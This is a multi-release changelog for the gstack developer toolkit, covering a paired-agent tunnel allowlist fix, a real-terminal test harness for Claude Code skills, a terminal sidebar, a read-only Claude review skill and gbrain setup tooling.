## **Paired-agent tunnel allowlist now matches what the docs already promised. Catch-22 resolved, gate is unit-testable.**

The visible bug: a paired remote agent over the ngrok tunnel hit 403s on `newtab`, `tabs`, `goto-on-existing-tab`, and a chain of other commands the operator docs claimed worked. The hidden bug: the v1.6.0.0 `TUNNEL_COMMANDS` allowlist was set at 17 entries while `docs/REMOTE_BROWSER_ACCESS.md`, `browse/src/cli.ts:546-586`, and the operator-facing instruction blocks all documented 26. The shipped allowlist drifted from the design intent silently for releases. This release closes the gap: 9 commands added (`newtab`, `tabs`, `back`, `forward`, `reload`, `snapshot`, `fill`, `url`, `closetab`), each bounded by the existing per-tab ownership check at `server.ts:613-624`. Scoped tokens default to `tabPolicy: 'own-only'`, so a paired agent still can't navigate, fill, or close on tabs it doesn't own — same isolation as before, just covering more verbs.

### The numbers that matter

Branch totals come from `git diff --shortstat origin/main..HEAD`. Test counts come from `bun test browse/test/dual-listener.test.ts browse/test/tunnel-gate-unit.test.ts browse/test/pair-agent-tunnel-eval.test.ts browse/test/pair-agent-e2e.test.ts` against the merged tree.

| Metric | Δ |
|---|---|
| Tunnel allowlist size | **17 → 26 commands** (+53%) |
| Catch-22 resolution | `newtab` → `goto` → `back` chain works for the first time |
| Gate testability | inline regex check → **pure exported `canDispatchOverTunnel()`** function |
| New unit-test coverage | **53 expects** in `tunnel-gate-unit.test.ts` (allowed, blocked, null/undefined/non-string, alias canonicalization) |
| New behavioral coverage | **4 tests** in `pair-agent-tunnel-eval.test.ts` running BOTH listeners locally (no ngrok) |
| Source-level guard | exact-set equality against the 26-command literal + ownership-exemption regex |
| All free tests | **69 pass / 0 fail** on the four touched test files |
| Codex review passes | **2 outside-voice rounds** during plan mode, 6 of 7 findings incorporated |

### What this means for users running paired agents

Three things change immediately. **First**, paired agents can actually open and drive their own tab without hitting the catch-22 the prior allowlist created. `newtab` succeeds (the ownership-exemption at `server.ts:613` was always there, but the allowlist gated the entry); `goto`, `back`, `forward`, `reload`, `fill`, `closetab` all work on the just-created tab; `snapshot`, `url`, `tabs` give the agent the read-side surface needed to be useful. **Second**, the tunnel-surface gate is unit-testable now — `canDispatchOverTunnel(command)` is pure, exported from `browse/src/server.ts`, and covered by 53 expects. A future refactor that decouples the allowlist literal from the gate logic fails a free test in milliseconds. **Third**, `pair-agent-tunnel-eval.test.ts` exercises the gate end-to-end with BOTH the local and tunnel listeners bound on 127.0.0.1 (no ngrok required) so the routing decision — "this request hit the tunnel listener, run the gate; this one hit the local listener, skip the gate" — is asserted on every PR. The new `BROWSE_TUNNEL_LOCAL_ONLY=1` env var binds the second listener locally without invoking ngrok, gated to no-op outside test mode. Production tunnel still requires `BROWSE_TUNNEL=1` + a valid `NGROK_AUTHTOKEN`.

### Itemized changes

#### Added

- 9 new commands in `browse/src/server.ts:111-120` `TUNNEL_COMMANDS` set: `newtab`, `tabs`, `back`, `forward`, `reload`, `snapshot`, `fill`, `url`, `closetab`. The set is now exported so tests can reference the literal directly.
- `canDispatchOverTunnel(command: string | undefined | null): boolean` in `browse/src/server.ts` — pure exported function. Handles non-string input, runs `canonicalizeCommand` for alias resolution, returns `TUNNEL_COMMANDS.has(canonical)`.
- `BROWSE_TUNNEL_LOCAL_ONLY=1` env var in `browse/src/server.ts:2080-2104`. Test-only sibling branch to `BROWSE_TUNNEL=1` that binds the second `Bun.serve` listener via `makeFetchHandler('tunnel')` without invoking ngrok. Persists `tunnelLocalPort` to the state file for the eval to read.
- `browse/test/tunnel-gate-unit.test.ts`: 53 expects covering all 26 allowed commands, 20 blocked commands (pair, unpair, cookies, setup, launch, restart, stop, tunnel-start, token-mint, etc.), null/undefined/empty/non-string defensive handling, and alias canonicalization (e.g. `set-content` resolves to `load-html` and is correctly rejected since `load-html` isn't tunnel-allowed).
- `browse/test/pair-agent-tunnel-eval.test.ts`: 4 behavioral tests that spawn the daemon under `BROWSE_HEADLESS_SKIP=1 BROWSE_TUNNEL_LOCAL_ONLY=1`, bind both listeners on 127.0.0.1, mint a scoped token via the existing `/pair` → `/connect` ceremony, and assert: (1) `newtab` over the tunnel passes the gate; (2) `pair` over the tunnel 403s with `disallowed_command:pair` AND writes a fresh denial-log entry to `~/.gstack/security/attempts.jsonl`; (3) `pair` over the local listener does NOT trigger the tunnel gate; (4) regression test for the catch-22 — `newtab` followed by `goto` on the resulting tab does not 403 with `Tab not owned by your agent`.

#### Changed

- `browse/test/dual-listener.test.ts`: must-include + must-exclude assertions replaced with one exact-set-equality test against the 26-command literal. The intersection-only style of the prior tests let new commands sneak into the source without a corresponding test update — the bidirectional check catches it both ways. Added a regex assertion that the `command !== 'newtab'` ownership-exemption clause at `server.ts:613` still exists (catches refactors that re-introduce the catch-22 from the other side).
- `browse/test/dual-listener.test.ts`: `/command` handler test updated to assert the inline `TUNNEL_COMMANDS.has(cmd)` check is now `canDispatchOverTunnel(body?.command)` — proves the gate is delegated to the pure function and not duplicated.
- `docs/REMOTE_BROWSER_ACCESS.md:35,168`: bumped "17-command allowlist" to "26-command allowlist". Corrected the denied-commands list (removed `eval`, which IS in the allowlist; the prior doc was wrong).
- `CLAUDE.md`: bumped the transport-layer security section's "17-command browser-driving allowlist" reference to "26-command".

#### For contributors

- The plan was reviewed under `/plan-eng-review` plus 2 sequential codex outside-voice passes during plan mode. Round-1 codex caught a doc-target mistake (we were going to update `SIDEBAR_MESSAGE_FLOW.md` instead of `REMOTE_BROWSER_ACCESS.md`) and a wrong-layer test design. Round-2 codex caught that the round-1 correction was still wrong (the chosen test harness only binds the local listener) AND that the docs promised 6 more commands than the allowlist had. All 6 of 7 substantive findings landed in the implementation; the 7th (a pre-existing `/pair-agent` `/health` probe mismatch at `cli.ts:656-668`) is logged as out of scope.
- One known accepted risk: `tabs` over the tunnel returns metadata for ALL tabs in the browser, not just tabs the agent owns. The user authored the trust relationship when they paired the agent, the agent already can't read CONTENT of unowned tabs (write commands blocked, the active tab can't be switched without a `tab <id>` command that's NOT in the allowlist), and tab IDs already leak via the 403 `hint` field on disallowed `goto`. Codex noted that tightening this requires touching the ownership gate itself (the gate falls back to `getActiveTabId()` BEFORE dispatch in `server.ts:603-614`), which is materially out of scope for a catch-22 fix. Logged in the plan failure-mode table as accepted.

## [1.15.0.0] - 2026-04-26

## **Real-PTY test harness ships. 11 plan-mode E2E tests, 23 unit tests, and 50K fewer tokens per invocation.**

Two big pieces of engineering in one release. The headline is a real-PTY test harness — 654 lines of TypeScript on top of `Bun.spawn({terminal:})` — that drives the actual `claude` binary and parses rendered terminal frames. Six new E2E tests on the harness cover behaviors that were structurally unreachable before: format compliance for every gstack `AskUserQuestion`, plan-design UI-scope detection (positive coverage), tool-budget regression vs prior runs, `/ship` end-to-end idempotency against a real git fixture, `/plan-ceo` answer-routing, and `/autoplan` phase sequencing. The branch nets ~11.6K lines smaller against `main` while adding ~1,450 lines of new TypeScript test code — preamble resolvers were rewritten to keep every semantic rule in less prose, and the test surface that catches AskUserQuestion drift expanded from zero to gate-tier on every PR.

### The numbers that matter

Branch totals come from `git diff --shortstat origin/main..HEAD`. Token-level reduction comes from regenerating every `SKILL.md` against the rewritten resolvers (`bun run gen:skill-docs --host all`). E2E numbers come from `EVALS=1 EVALS_TIER=gate bun test test/skill-e2e-*.test.ts` on a clean working tree.

| Metric | Δ |
|---|---|
| Net branch size vs `main` | **−11,609 lines** (89 files, +7,240 / −18,849) |
| New test files added | **8 files** (1 harness unit-test + 7 E2E tests) |
| New test code shipped | **~1,453 lines** of TypeScript |
| Real-PTY harness module | **654 lines** in `test/helpers/claude-pty-runner.ts` |
| Per-invocation token savings | **−196K tokens (−25%)** on cold reads |
| `plan-ceo-review` preamble | **−43%** (54 KB → 31 KB) |
| Plan-mode E2E test count | **5 → 11** |
| New gate-tier paid E2E tests | **+3** (format compliance, design-with-UI, budget regression) |
| New periodic-tier paid E2E tests | **+3** (mode-routing, ship-idempotency, autoplan-chain) |
| Helper unit test coverage | **+23 tests** for parser + budget primitives |
| All free tests | **49 pass, 0 fail** |

| Skill class | Per-invocation surface | Δ |
|---|---|---|
| Tier-≥3 plan reviews (full preamble) | ~50 KB → ~30 KB | −40% |
| Tier-1 quick skills | ~12 KB → ~9 KB | −25% |

Every gstack invocation now sends ~50K fewer tokens to the model on cold reads — that's roughly a quarter of a typical 200K context window freed up for actual work. Tier-≥3 plan reviews keep their full functional surface (Brain Sync, Context Recovery, Routing Injection) and still lose almost half the bytes.

### What this means for builders

Three new classes of regression that were previously impossible to catch now block every PR. **Format drift**: a missing `Recommendation:` line or absent Pros/Cons bullet on an `AskUserQuestion` is caught against the real rendered terminal — not the model's claim about what it would have shown. **Conditional skill paths**: `/plan-design-review` had to early-exit when there's no UI scope, but until this release nothing tested the *positive* path; a regression that flipped the detector to "early-exit always" could have shipped silently. **Tool-budget regressions**: a preamble change that makes any skill burn 2× its prior tool calls fails a free, branch-scoped assertion that runs on every `bun test`.

The harness itself is a reusable primitive. `runPlanSkillObservation()` watches plan-mode terminal output and classifies outcomes as `asked` / `plan_ready` / `silent_write` / `exited` / `timeout`. Three periodic-tier tests built on top of it cover the heavier cases — multi-phase chain ordering, ship idempotency state-machine end-to-end, and answer routing through 8-12 sequential prompts — that don't fit a per-PR budget but run weekly. Pull, run `bun run gen:skill-docs --host all`, and every skill invocation is meaningfully smaller and meaningfully better-tested than the prior release.

### Itemized changes

#### Added

- `test/helpers/claude-pty-runner.ts`: real-PTY test harness using `Bun.spawn({terminal:})` (Bun 1.3.10+ has built-in PTY — no `node-pty`, no native modules). Exposes `launchClaudePty()` for raw session control and `runPlanSkillObservation()` as the high-level contract for plan-mode skill tests.
- `parseNumberedOptions(visible)` and `isPermissionDialogVisible(visible)` helpers in `claude-pty-runner.ts`. Tests can now look up an option index by its label without hard-coding positions, and auto-grant Claude Code's file-edit / workspace-trust / bash-permission dialogs that fire during preamble side-effects.
- `findBudgetRegressions()` and `assertNoBudgetRegression()` in `test/helpers/eval-store.ts`. Pure functions returning tests that grew >2× in tools or turns vs the prior eval run, with floors at 5 prior tools / 3 prior turns to avoid noise. Env override `GSTACK_BUDGET_RATIO`.
- 6 new real-PTY E2E tests on the harness:
    - `skill-e2e-ask-user-question-format-compliance.test.ts` (gate, ~$0.50/run): asserts every gstack `AskUserQuestion` rendering contains the 7 mandated format elements (ELI10, Recommendation, Pros/Cons with ✅/❌, Net, `(recommended)` label).
    - `skill-e2e-plan-design-with-ui.test.ts` (gate, ~$0.80/run): positive coverage for `/plan-design-review` UI-scope detection. Counterpart to the existing no-UI early-exit test — without it, a regression that flips the detector to "early-exit always" would ship undetected.
    - `skill-budget-regression.test.ts` (gate, free): branch-scoped library-only assertion that no skill burns >2× tools or turns vs its prior recorded run.
    - `skill-e2e-plan-ceo-mode-routing.test.ts` (periodic, ~$3/run): verifies AskUserQuestion answer routing — HOLD SCOPE picks routes to rigor language, SCOPE EXPANSION picks route to expansion language.
    - `skill-e2e-ship-idempotency.test.ts` (periodic, ~$3/run): runs `/ship` end-to-end against a real git fixture with `STATE: ALREADY_BUMPED` baked in; asserts no double-bump, no double-commit, no fixture mutation.
    - `skill-e2e-autoplan-chain.test.ts` (periodic, ~$8/run): asserts `/autoplan` phase ordering by tee'ing timestamps as each `**Phase N complete.**` marker appears.
- `test/helpers-unit.test.ts`: 23 unit tests covering `parseNumberedOptions` edge cases (empty, partial paint, >9 options, stale-vs-fresh anchoring) and `findBudgetRegressions` (noise floor, env override, missing tool data).
- `test/fixtures/plans/ui-heavy-feature.md`: planted plan with explicit UI scope keywords for the new design-with-UI test.
- Auto-handling of the workspace-trust dialog so tests run in temp directories without manual intervention.
- Outcome contract: `asked` | `plan_ready` | `silent_write` | `exited` | `timeout`. Tests pass on `asked` or `plan_ready`, fail on the rest.

#### Changed

- 18 preamble resolvers compressed: `generate-ask-user-format.ts`, `generate-brain-sync-block.ts`, `generate-completeness-section.ts`, `generate-completion-status.ts`, `generate-confusion-protocol.ts`, `generate-context-health.ts`, `generate-context-recovery.ts`, `generate-continuous-checkpoint.ts`, `generate-lake-intro.ts`, `generate-preamble-bash.ts`, `generate-proactive-prompt.ts`, `generate-routing-injection.ts`, `generate-telemetry-prompt.ts`, `generate-upgrade-check.ts`, `generate-vendoring-deprecation.ts`, `generate-voice-directive.ts`, `generate-writing-style-migration.ts`, `generate-writing-style.ts`.
- All 47 generated `SKILL.md` files regenerated; 3 ship golden fixtures regenerated.
- Plan-* skills retain full preamble surface (Brain Sync, Context Recovery, Routing Injection) — the early slim attempt that cut these was reverted after diagnosing them as load-bearing.
- 5 existing plan-mode tests (`plan-ceo`, `plan-eng`, `plan-design`, `plan-devex`, `plan-mode-no-op`) rewritten onto the new harness with a 300s observation budget. All 5 verify-pass under `EVALS=1 EVALS_TIER=gate` against the real `claude` binary in 790s sequential.
- `isNumberedOptionListVisible` regex tolerates whitespace collapse from TTY cursor-positioning escapes (`\x1b[40C`) which `stripAnsi` removes — `\b2\.` was failing on word-to-word transitions where stripped output read `text2.`.

#### Fixed

- `scripts/skill-check.ts`: new `isRepoRootSymlink()` helper so dev installs that mount the repo root at `host/skills/gstack` (e.g., codex's `.agents/skills/gstack`) get skipped instead of double-counted.
- `test/skill-validation.test.ts`: known-large-fixture exemption keeps `browse/test/fixtures/security-bench-haiku-responses.json` (27 MB BrowseSafe-Bench replay fixture, intentional) out of the size warning.

#### Removed

- `test/helpers/plan-mode-helpers.ts`: superseded by `claude-pty-runner.ts`. Zero callers remained after the rewrite.

#### For contributors

- `test/helpers/touchfiles.ts`: 5 plan-mode test selections + e2e-harness-audit selection now point at `claude-pty-runner.ts` instead of the deleted helper. 6 new entries (`ask-user-question-format-pty`, `plan-ceo-mode-routing`, `plan-design-with-ui-scope`, `budget-regression-pty`, `ship-idempotency-pty`, `autoplan-chain-pty`) with tier classifications: 3 gate, 3 periodic.
- `test/e2e-harness-audit.test.ts`: recognizes `runPlanSkillObservation` as a valid coverage path alongside the legacy `canUseTool` / `runPlanModeSkillTest` patterns.
- New unit test: `test/gen-skill-docs.test.ts` asserts plan-review preambles stay under 33 KB and the slim Voice section preserves its load-bearing semantic contract (lead-with-the-point, name-the-file, user-outcome framing, no-corporate, no-AI-vocab, user-sovereignty).
- `test/touchfiles.test.ts`: skill-specific change selection count updated 15 → 18 to match the 6 new touchfile entries that depend on `plan-ceo-review/**`.

## [1.14.0.0] - 2026-04-25

## **The gstack browser sidebar is now an interactive Claude Code REPL with live tab awareness.**

Open the side panel and Claude Code is right there in a real terminal. Type, watch the agent work, switch browser tabs and Claude sees the change. The old one-shot chat queue is gone. Two-way conversation, slash commands, `/resume`, ANSI colors, all of it. Plus a `$B tab-each` command that fans out a single browse command across every open tab and returns per-tab JSON results.

### The numbers that matter

| Metric | Before | After | Δ |
|---|---|---|---|
| Sidebar surfaces | Chat (one-shot `claude -p`) + 3 debug | Terminal (live PTY) + 3 debug | -1 surface, +interactive |
| Subprocesses spawned per session | Many (one per chat message) | One (PTY claude, lazy-spawned) | -N |
| Lines in `extension/sidepanel.js` | 1969 | 1042 | -47% |
| Total diff | — | 27 files, +2875 / -3885 | -1010 net |
| New unit + integration + regression tests | 0 | 56+ | +56 |
| Live `tabs.json` push latency | n/a (no live state) | <50ms after `chrome.tabs` event | new capability |

### What this means for builders

Open the sidebar, type. Real PTY means slash commands, `/resume`, real ANSI rendering, real claude process lifecycle. Switch browser tabs while Claude is running and `<stateDir>/tabs.json` + `active-tab.json` update in place — Claude reads them, no need to ask `$B tabs`. Need to do the same thing on every tab? `$B tab-each <command>` returns a JSON array, original active tab restored when done, no OS focus stealing.

The old chat queue is gone. `sidebar-agent.ts`, `/sidebar-command`, `/sidebar-chat`, `/sidebar-agent/event` all deleted. The Cleanup / Screenshot / Cookies toolbar buttons survive in the Terminal pane — Cleanup pipes its prompt straight into the live PTY via `window.gstackInjectToTerminal()` instead of spawning yet another `claude -p`.

### Itemized changes

#### Added

- **Interactive Terminal sidebar tab.** xterm.js + a non-compiled `terminal-agent.ts` Bun process that spawns claude with `Bun.spawn({terminal: {rows, cols, data}})`. Auto-connects when the side panel opens, no keypress needed.
- **`$B tab-each <command>`** — fan-out helper for multi-tab work. Returns `{command, args, total, results: [{tabId, url, title, status, output}]}`. Skips chrome:// pages, scope-checks the inner command before iterating, restores the original active tab in a `finally` block, never pulls focus away from the user's foreground app.
- **Live tab state files.** `<stateDir>/tabs.json` (full list with id, url, title, active, pinned, audible, windowId) and `<stateDir>/active-tab.json` (current active). Updated atomically on every `chrome.tabs` event (activated, created, removed, URL/title change). Claude reads on demand instead of running `$B tabs`.
- **Tab-awareness system prompt** injected via `claude --append-system-prompt` at spawn so the model knows about the state files and the `$B tab-each` command without being told.
- **Always-visible Restart button** in the Terminal toolbar. Force-restart claude any time, not just from the "session ended" state.

#### Changed
- **Sidebar is Terminal-only.** No more `Terminal | Chat` primary tab nav. Activity / Refs / Inspector still live behind the `debug` toggle in the footer. Quick-actions (🧹 Cleanup / 📸 Screenshot / 🍪 Cookies) moved into the Terminal toolbar.
- **WebSocket auth uses `Sec-WebSocket-Protocol`** instead of cookies. Browsers can't set `Authorization` on WS upgrades, and `SameSite=Strict` cookies don't survive the cross-port jump from server.ts:34567 to the agent's random port from a chrome-extension origin. The token rides on `new WebSocket(url, [`gstack-pty.<token>`])` and the agent echoes the protocol back (Chromium closes connections that don't pick a protocol).
- **Cleanup button now drives the live PTY.** Clicking "🧹 Cleanup" injects the cleanup prompt straight into claude via `window.gstackInjectToTerminal()`. The Inspector "Send to Code" action uses the same path. No more `/sidebar-command` POSTs.
- **Repaint after debug-tab close.** xterm.js doesn't auto-redraw when its container flips from `display: none` back to `display: flex`. A MutationObserver on `#tab-terminal`'s class attribute now forces a `fitAddon.fit() + term.refresh() + resize` push when the pane becomes visible.

#### Removed
- **`browse/src/sidebar-agent.ts`** — the one-shot `claude -p` queue worker. ~900 lines.
- **Server endpoints**: `/sidebar-command`, `/sidebar-chat[/clear]`, `/sidebar-agent/{event,kill,stop}`, `/sidebar-tabs[/switch]`, `/sidebar-session{,/new,/list}`, `/sidebar-queue/dismiss`. ~600 lines.
- **Chat-related state** in server.ts: `ChatEntry`, `SidebarSession`, `TabAgentState`, `pickSidebarModel`, `addChatEntry`, `processAgentEvent`, `killAgent`, the agent-health watchdog, `chatBuffer`, the per-tab agent map.
- **Chat UI in sidepanel.html**: primary-tab nav, `<main id="tab-chat">`, the chat input bar, the experimental "Browser co-pilot" banner, the security event banner, the `clear-chat` footer button.
- **Five obsolete test files**: `sidebar-agent.test.ts`, `sidebar-agent-roundtrip.test.ts`, `security-e2e-fullstack.test.ts`, `security-review-fullstack.test.ts`, `security-review-sidepanel-e2e.test.ts`. Plus 5 chat-only describe blocks inside surviving security tests (loadSession session-ID validation, switchChatTab DocumentFragment, pollChat reentrancy, sidebar-tabs URL sanitization, agent queue security).

#### For contributors
- **`browse/src/pty-session-cookie.ts`** mirrors `sse-session-cookie.ts`. Same TTL, same opportunistic pruning, separate registry (PTY tokens must never be valid as SSE tokens or vice versa).
- **`docs/designs/SIDEBAR_MESSAGE_FLOW.md`** rewritten around the Terminal flow: WebSocket upgrade, dual-token model (`AUTH_TOKEN` for `/pty-session`, `gstack-pty.<token>` for `/ws`, `INTERNAL_TOKEN` for server↔agent loopback), threat-model boundary (Terminal tab bypasses the prompt-injection stack on purpose; user keystrokes are the trust source).
- **`browse/test/terminal-agent.test.ts`** (16 tests) + `terminal-agent-integration.test.ts` (real `/bin/bash` PTY round-trip, raw `Sec-WebSocket-Protocol` upgrade verification) + `tab-each.test.ts` (10 tests with mock `BrowserManager`) + `sidebar-tabs.test.ts` (27 structural assertions locking the chat-rip invariants).
- **CLAUDE.md** updated with the dual-token model, the cookie-vs-protocol rationale, and the cross-pane injection pattern.
- **`vendor:xterm`** build step copies `xterm@5.x` and `xterm-addon-fit` from `node_modules/` into `extension/lib/` at build time. xterm files are gitignored.
- **TODOS.md** carries three v1.1+ follow-ups: PTY session survival across sidebar reload (Issue 1C deferred), `/health` `AUTH_TOKEN` distribution audit (codex finding, pre-existing soft leak), and dropping the now-dead `security-classifier.ts` ML pipeline.

## [1.13.0.0] - 2026-04-25

## **`/gstack-claude` gives non-Claude hosts a read-only outside voice.**

This release adds the reverse of `/codex`: external hosts can now ask Claude for review, adversarial challenge, or read-only consultation without handing nested Claude mutation tools.

### Added

- `claude/SKILL.md.tmpl`: new external-only `/gstack-claude` skill with `review`, `challenge`, and `consult` modes.
- Review and challenge mode feed the detected base-branch diff to `claude -p --tools ""` with `--disable-slash-commands`.
- Consult mode allows only `Read,Grep,Glob`, explicitly disallows `Bash,Edit,Write`, saves `.context/claude-session-id`, and can resume the prior consult session.
- Claude prompt transport now uses a `/tmp/gstack-claude-prompt-*` file piped over stdin with cleanup.
- Auth checks require the `claude` CLI plus either `~/.claude/.credentials.json` or `ANTHROPIC_API_KEY`.
- JSON output parsing extracts `result`, `usage`, `model`, `session_id`, and `is_error`.

### Fixed

- `hosts/claude.ts`: excludes the Claude outside-voice skill from Claude-host generation.
- `test/brain-sync.test.ts`: the `GSTACK_HOME` isolation test now snapshots and preserves the real config file instead of assuming local machine state.
- `claude/SKILL.md.tmpl`: uses `mktemp` for diff capture in review/challenge mode instead of a `$$`-based temp path, avoiding collisions across concurrent invocations.

### Changed

- `test/skill-validation.test.ts`: the tracked-file-size check is now advisory. Large fixtures remain allowed in git and are reported as `[size-warning]` instead of failing the suite.
- `test/gen-skill-docs.test.ts`: generation coverage now asserts external host docs include `gstack-claude/SKILL.md` while Claude host output omits `claude/SKILL.md`.

## [1.12.2.0] - 2026-04-24

## **`/setup-gbrain` polish: PATH parsing, repo init order, MCP user scope.**

Small refinements to the /setup-gbrain onboarding path.

### Fixed
- `bin/gstack-gbrain-install`: parse `gbrain --version` output with `awk '{print $NF}'` so the D19 PATH-shadow check compares just the version number.
- `bin/gstack-brain-init`: omit `--source` from `gh repo create`. Later steps handle `git init` + remote setup explicitly.
- `setup-gbrain` Step 9: smoke test uses `gbrain put <slug>` with body piped on stdin.
- `setup-gbrain` Step 5a: MCP registers with `--scope user` and an absolute path to the gbrain binary, so `mcp__gbrain__*` tools are available in every Claude Code session on the machine.

### Changed
- `test/gstack-brain-init-gh-mock.test.ts`: asserts `--source` is absent from the `gh repo create` call.

## [1.12.1.0] - 2026-04-24

## **Plan-mode review skills run the review directly, no more "exit and rerun" prompt.**

Before this release, `/plan-eng-review` (and the three other `interactive: true` review skills) greeted plan-mode users with an A/B/C handshake asking them to exit plan mode and rerun, or cancel. That handshake was vestigial: the preamble already contains an authoritative "Skill Invocation During Plan Mode" rule saying AskUserQuestion satisfies plan mode's end-of-turn requirement. Two contradictory rules, the bossy one at the top won, the review never ran. This release deletes the bossier rule and hoists the correct one to position 1 of the preamble so skills run straight through.

### What shipped

The vestigial `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` resolver is deleted. The "Plan Mode Safe Operations" and "Skill Invocation During Plan Mode" blocks are split out of `generate-completion-status.ts` into a sibling `generatePlanModeInfo()` export in the same module, then wired at preamble position 1 where the handshake used to live. The "you see this first" positioning stays; only the content changes. Four dead plan-mode-handshake question-registry IDs are removed. The `interactive: true` frontmatter flag stays on the four review skill templates because `test/e2e-harness-audit.test.ts` reads it to classify which skills must have `canUseTool` coverage, per codex outside-voice review.

The four per-skill plan-mode E2E tests are rewritten as smoke tests that assert Step 0's actual scope-mode question fires (not an A/B/C handshake), no Write/Edit before the first AskUserQuestion, and no early `ExitPlanMode`. The write-guard helper from the old `plan-mode-handshake-helpers.ts` is preserved in the renamed `plan-mode-helpers.ts` so silent-bypass regressions still get caught. `test/skill-e2e-plan-mode-no-op.test.ts` is kept for the opposite coverage case: the plan-mode-info block stays quiet outside plan mode. `test/gen-skill-docs.test.ts` now scans every generated `SKILL.md` across all 9 host subdirs (`.agents/`, `.openclaw/`, `.kiro/`, etc.) and asserts `## Plan Mode Handshake` is absent. That's a sub-second unit gate blocking any future PR from re-introducing the resolver.

### The numbers that matter

Source: `bun test` on HEAD against the pre-change baseline.

| Metric | Before | After | Δ |
|---|---|---|---|
| Preamble resolvers | 19 (handshake + completion-status) | 18 (completion-status owns both functions) | -1 module |
| Handshake lines in generated SKILL.md | 92 per skill × 4 skills = 368 | 0 | -368 |
| Question-registry entries | 51 | 47 | -4 dead entries |
| Plan-mode gate-tier tests | 5 handshake-asserting | 5 smoke + no-op + write-guard | same count, stronger assertions |
| Multi-host handshake-absence unit test | none | 1 (scans 9 host dirs, <1s) | new regression gate |
| `bun test` on changed files | 360 gen-skill-docs pass | 360 gen-skill-docs pass | no regression |

The preamble position for the new `## Skill Invocation During Plan Mode` section lands at line ~127 of every `plan-*-review/SKILL.md` (first ~15% of the file), before the upgrade check and onboarding gates, so the authoritative plan-mode rule is the first thing the model reads after bash env setup.

### What this means for plan-mode users

Invoke `/plan-eng-review` from plan mode. You get the scope-mode question (`SCOPE EXPANSION` / `SELECTIVE EXPANSION` / `HOLD SCOPE` / `SCOPE REDUCTION`) immediately, the review runs, each finding gets its own `AskUserQuestion`, `ExitPlanMode` fires at the end. No two-step "exit and rerun" friction. Same for `/plan-ceo-review`, `/plan-design-review`, `/plan-devex-review`.

### Itemized changes

#### Fixed

- `/plan-eng-review`, `/plan-ceo-review`, `/plan-design-review`, `/plan-devex-review` no longer show an A/B/C handshake prompt when invoked in plan mode. Each skill runs its interactive review directly, with every finding gated by `AskUserQuestion` just like outside plan mode.

#### Changed

- The "Plan Mode Safe Operations" and "Skill Invocation During Plan Mode" preamble sections are now emitted at position 1 (right after the bash env setup) instead of at the tail of the completion-status block. All skills see these two sections earlier in the preamble; nothing else changes about the content.
- `test/helpers/plan-mode-handshake-helpers.ts` is renamed to `test/helpers/plan-mode-helpers.ts`. The exported API is renamed from `runPlanModeHandshakeTest` to `runPlanModeSkillTest` and from `assertHandshakeShape` to `assertNotHandshakeShape`. The write-guard detection (no `Write`/`Edit` tool call before the first `AskUserQuestion`) is preserved and extended with `ExitPlanMode`-before-ask detection.

#### Removed

- `scripts/resolvers/preamble/generate-plan-mode-handshake.ts` deleted (vestigial, superseded by `generatePlanModeInfo` in `generate-completion-status.ts`).
- Four question-registry entries removed from `scripts/question-registry.ts`: `plan-ceo-review-plan-mode-handshake`, `plan-eng-review-plan-mode-handshake`, `plan-design-review-plan-mode-handshake`, `plan-devex-review-plan-mode-handshake`. These IDs are no longer emitted by any skill; keeping them in the registry was dead weight.

#### For contributors

- `test/gen-skill-docs.test.ts` now has a "plan-mode-info resolver" describe block that (a) scans every generated `SKILL.md` under the repo root plus every host subdir (`.agents/`, `.openclaw/`, `.opencode/`, `.factory/`, `.hermes/`, `.kiro/`, `.cursor/`, `.slate/`) and asserts `## Plan Mode Handshake` is absent, and (b) asserts `## Skill Invocation During Plan Mode` lands in the first 15,000 bytes of each of the four review skills' generated `SKILL.md`. Both assertions run on every `bun test`. Any PR that re-introduces the handshake resolver fails CI immediately.
- The `interactive: true` frontmatter flag on the four review skill templates is preserved. It still has a reader: `test/e2e-harness-audit.test.ts` uses it to enforce `canUseTool` coverage on interactive review E2E tests. Removing the flag was part of the initial plan; codex outside-voice review caught the downstream dependency during review and that decision was reversed.

## [1.12.0.0] - 2026-04-24

## **`/setup-gbrain` — any coding agent goes from zero to "gbrain is running, and I can call it" in under five minutes.**

gstack v1.9.0.0 shipped `gbrain-sync`, which assumed a `gbrain` CLI was already installed. That was fine on Garry's machine (he'd manually cloned `~/git/gbrain`), broken for everyone else. This release closes the onboarding gap: one skill, three paths (local PGLite, existing Supabase URL, or Supabase auto-provision via the Management API), an MCP registration step for Claude Code, a per-remote trust triad (read-write / read-only / deny) so multi-client consultants don't mingle brains, and a reusable secret-sink test harness other skills can import when they start handling secrets.

### What shipped

Six new `bin/` helpers and one new skill template. `bin/gstack-gbrain-repo-policy` stores per-remote ingest tiers at `~/.gstack/gbrain-repo-policy.json` with a `_schema_version: 2` field so future migrations are deterministic (the first one — legacy `allow` → `read-write` — already runs on first read of any pre-D3 file). `bin/gstack-gbrain-detect` emits the full state as JSON so the skill can skip steps that are already done. `bin/gstack-gbrain-install` probes `~/git/gbrain` and `~/gbrain` before cloning fresh (fixes the day-one dup-clone footgun on the author's own machine) and fails hard on PATH shadowing with a three-option remediation menu instead of warn-and-continue. `bin/gstack-gbrain-lib.sh` extracts the `read_secret_to_env` helper used for both PAT collection and pooler-URL paste — one canonical implementation of the stty-echo-off + SIGINT-restore + env-var-only pattern. `bin/gstack-gbrain-supabase-verify` rejects direct-connection URLs (IPv6-only, fails in most environments) with exit code 3 so the caller's retry UX is distinct from a generic format error. `bin/gstack-gbrain-supabase-provision` wraps the Management API — list-orgs, create, poll, pooler-url, list-orphans, delete-project — with full HTTP error coverage (401/403/402/409/429/5xx), exponential backoff, and `--cleanup-orphans` support for the rare case where someone kills setup mid-provision.

The skill template itself threads these together into a single interactive flow. PAT collection shows the full scope disclosure verbatim before the read-s prompt, explains that the token grants access to every project in the user's Supabase account, and emits a revocation reminder at the end. Path 1's pooler-URL paste gets the same hygiene plus a redacted preview (host / port / database visible, password masked). Switching between engines wraps `gbrain migrate` in `timeout 180s` with an actionable message on deadlock. Concurrent-run protection via `mkdir ~/.gstack/.setup-gbrain.lock.d`. Telemetry records scenario, install result, MCP opt-in, trust tier — all enumerated categorical values, never free-form strings that could leak secrets.

`/health` gets a new GBrain dimension (weight 10%, wrapped in `timeout 5s`) alongside type-check / lint / tests / dead-code / shell-linter. The dimension is omitted — not red — when gbrain isn't installed, so running `/health` on a non-gbrain machine doesn't penalize that choice.

